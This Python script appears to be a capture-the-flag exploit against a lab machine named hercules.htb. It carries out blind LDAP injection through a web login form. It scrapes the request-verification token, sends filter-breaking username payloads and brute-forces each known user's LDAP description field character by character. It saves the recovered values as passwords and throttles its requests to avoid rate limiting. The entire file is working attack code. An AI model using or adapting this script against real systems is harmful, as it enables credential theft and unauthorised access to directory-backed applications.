#!/usr/bin/env python3
import requests
import string
import urllib3
import re
import time

GREEN = "\033[92m"
RESET = "\033[0m"

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
BASE = "https://hercules.htb"
LOGIN_PATH = "/Login"
LOGIN_PAGE = "/login"
TARGET_URL = BASE + LOGIN_PATH
VERIFY_TLS = False

# Success indicator (valid user, wrong password)
SUCCESS_INDICATOR = "Login attempt failed"

# Token regex
TOKEN_RE = re.compile(r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"', re.IGNORECASE)

with open("usernames.txt", "r") as f:
    KNOWN_USERS = [line.strip() for line in f if line.strip()]

def get_token_and_cookie(session):
    response = session.get(BASE + LOGIN_PAGE, verify=VERIFY_TLS)
    token = None
    match = TOKEN_RE.search(response.text)
    if match:
        token = match.group(1)
    return token

def test_ldap_injection(username, description_prefix=""):
    session = requests.Session()
    token = get_token_and_cookie(session)
    if not token:
        return False

    # Build LDAP injection payload
    if description_prefix:
        escaped_desc = description_prefix
        if '*' in escaped_desc:
            escaped_desc = escaped_desc.replace('*', '\\2a')
        if '(' in escaped_desc:
            escaped_desc = escaped_desc.replace('(', '\\28')
        if ')' in escaped_desc:
            escaped_desc = escaped_desc.replace(')', '\\29')
        payload = f"{username}*)(description={escaped_desc}*"
    else:
        # Check if user has description field
        payload = f"{username}*)(description=*"

    # Double URL encode
    encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))

    data = {
        "Username": encoded_payload,
        "Password": "test",
        "RememberMe": "false",
        "__RequestVerificationToken": token
    }

    try:
        response = session.post(TARGET_URL, data=data, verify=VERIFY_TLS, timeout=5)
        return SUCCESS_INDICATOR in response.text
    except Exception as e:
        return False

def enumerate_description(username):
    charset = (
        string.ascii_lowercase +
        string.digits +
        string.ascii_uppercase +
        "!@#$_*-." + # Common special chars
        "%^&()=+[]{}|;:',<>?/`~\" \\" # Less common special chars
    )

    print(f"\n[*] Checking user: {username}")

    if not test_ldap_injection(username):
        print(f"[-] User {username} has no description field")
        return None

    print(f"[+] User {username} has a description field, enumerating...")
    description = ""
    max_length = 50
    no_char_count = 0

    for position in range(max_length):
        found = False
        for char in charset:
            test_desc = description + char
            if test_ldap_injection(username, test_desc):
                description += char
                print(f" Position {position}: '{char}' -> Current: {description}")
                found = True
                no_char_count = 0
                break
            # Small delay to avoid rate limiting IMPORTANT!!!
            time.sleep(0.01)

        if not found:
            no_char_count += 1
            if no_char_count >= 2:
                break

    if description:
        print(f"[+] Complete: {username} => {description}")
        return description
    return None

def main():
    print("="*60)
    print("Hercules LDAP Description/Password Enumeration")
    print(f"Testing {len(KNOWN_USERS)} users")
    print("="*60)

    found_passwords = {}
    
    for user in KNOWN_USERS:
        password = enumerate_description(user)
        if password:
            found_passwords[user] = password
            
            # Save results immediately
            with open("passwords.txt", "a") as f:
                f.write(f"{user}:{password}\n")
            print(f"\n[+] FOUND: {user}:{GREEN}{password}{RESET}\n")

    print("\n" + "="*60)
    print("ENUMERATION COMPLETE")
    print("="*60)

    if found_passwords:
        print(f"\nFound {len(found_passwords)} passwords:")
        for user, pwd in found_passwords.items():
            print(f" {user}: {pwd}")
    else:
        print("\nNo passwords found")

if __name__ == "__main__":
    main()